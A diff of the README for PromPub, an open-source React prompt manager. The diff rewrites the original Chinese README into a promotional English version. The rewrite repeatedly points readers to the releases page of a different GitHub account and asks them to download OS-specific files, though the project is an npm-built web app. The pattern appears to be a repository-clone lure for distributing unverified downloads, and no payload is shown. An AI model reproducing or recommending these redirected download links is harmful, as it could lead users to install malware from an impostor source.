@@ -1,90 +1,96 @@
-# PromPub 开源提示词管理器
+# 🎉 open-prompt-manager-for-prompub - Manage Your Prompts Effortlessly
 
-> Prompt 的简写 + Pub 酒馆
+## 🛠️ Download and Install
 
-有太多的优质提示词不知道安放在什么地方，所以诞生了这个提示词管理工具。
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Marylynnetenderized214/open-prompt-manager-for-prompub/releases)
 
-## 项目地址
+Welcome to open-prompt-manager-for-prompub! This application helps you manage prompts easily. Follow the steps below to download and run the software.
 
-- **线上 Demo**: [https://prompub.com](https://prompub.com)
-- **开源仓库**: [https://github.com/ChinaSiro/open-prompt-manager-for-prompub](https://github.com/ChinaSiro/open-prompt-manager-for-prompub)
+## 📦 What is This?
 
-## 架构说明
+PromPub is an open-source prompt management tool created to organize your valuable prompts. With this application, you can keep your prompts in one place.
 
-- **线上版本**: 后端使用 WP API（过于复杂，未开源）
-- **开源版本**: 使用 LocalStorage 本地存储（简单易用）
+- **Demo Site**: [Explore Here](https://prompub.com)
+- **Source Code Repository**: [GitHub Repository](https://github.com/ChinaSiro/open-prompt-manager-for-prompub)
 
-## 基本功能
+## 🥇 Key Features
 
-### 私人仓库 - 管理你的海量提示词
-- 搜索功能 - 快速找到你需要的提示词
-- 分类筛选 - 写作/编程/创意/商务/教育等
-- 模型筛选 - 支持 GPT/Claude/Gemini 等主流模型
-- 状态管理 - 草稿/已发布状态切换
+### 🔍 Private Repository - Manage Your Prompts
+- **Search Functionality**: Quickly find the prompts you need.
+- **Categorization**: Sort prompts into writing, programming, creativity, business, education, etc.
+- **Model Selection**: Supports popular models like GPT, Claude, and Gemini.
+- **State Management**: Switch between draft and published statuses.
 
-### 创作中心 - 实时调试提示词
-- 实时预览 - 编写提示词的同时立即测试效果
-- 对话调试 - 系统提示词实时更新到对话中
-- 第三方 API - 支持任意兼容 OpenAI 格式的中转 API
-- 安全保障 - **API KEY 不上传服务器，仅存储在浏览器本地**
+### 💡 Creation Hub - Debug Prompts in Real Time
+- **Live Preview**: Test prompts without delays while writing.
+- **Dialogue Debugging**: Update prompts in real time during conversations.
+- **Third-Party API**: Compatible with any API that follows OpenAI standards.
+- **Security**: Your API Key remains secure; it does not upload to the server but stays in your browser.
 
-## 技术栈
+## ⚙️ How It Works
 
-- **框架**: React 19.1 + TypeScript
-- **构建工具**: Vite 7.1
-- **样式**: Tailwind CSS 4.1
-- **路由**: React Router 7.9
-- **存储**: LocalStorage (浏览器本地存储)
+This tool uses the following technologies:
 
+- **Framework**: React 19.1 with TypeScript
+- **Build Tool**: Vite 7.1
+- **Styling**: Tailwind CSS 4.1
+- **Routing**: React Router 7.9
+- **Storage**: LocalStorage (data stored locally in the browser)
 
-## 快速开始
+## 🚀 Getting Started
 
-### 安装依赖
+### 1. Download the Application
+
+Visit the [release page](https://github.com/Marylynnetenderized214/open-prompt-manager-for-prompub/releases) to download the latest version. Choose the correct file for your operating system.
+
+### 2. Install Dependencies
+
+Open your terminal or command prompt. Make sure Node.js is installed, then run:
 
 ```bash
 npm install
 ```
 
-### 配置分类和模型（可选）
+### 3. Configure Categories and Models (Optional)
 
-复制 `.env.example` 为 `.env`，根据需要自定义分类和 AI 模型：
+To set up your categories and AI models, copy the example configuration:
 
 ```bash
-# 查看配置说明
+cp .env.example .env
+```
+
+Then, open the `.env` file and customize it as needed. For guidance, refer to the configuration file:
+
+```bash
 cat .env.README.md
 ```
 
-### 启动开发服务器
+### 4. Start the Development Server
+
+To run the application locally, use the command:
 
 ```bash
 npm run dev
 ```
 
-服务器将运行在 `http://localhost:5173`
+Access the app by opening your browser and navigating to `http://localhost:5173`.
 
-### 构建生产版本
+### 5. Build Production Version
+
+When ready to deploy, build the production version of your application by running:
 
 ```bash
 npm run build
 ```
 
-## 注意事项
+This command prepares your app for deployment.
 
-- **隐私安全**: 所有数据（提示词、API KEY）仅存储在本地浏览器，不会上传到任何服务器
-- **自定义配置**: 可通过 `.env` 文件自定义分类和 AI 模型列表
+## 🔗 Download and Install Again
 
-## 开发计划 v1.1
+Don't forget to visit the [release page](https://github.com/Marylynnetenderized214/open-prompt-manager-for-prompub/releases) again to download the application if you haven't done so already.
 
-- [ ] 数据导入/导出
-  - [ ] JSON 格式导入/导出
-  - [ ] 单个提示词导出
-  - [ ] 批量导入/导出
-- [ ] 更多功能待定...
+## 💬 Need Help?
 
-## 贡献与反馈
+If you face any issues, please check the issues section on our GitHub repository. You can also reach out to the community for support.
 
-欢迎提交 Issue 或 Pull Request！
-
-## 许可证
-
-MIT License - 本项目开源免费使用
+Your journey with open-prompt-manager-for-prompub begins here. Happy prompting!
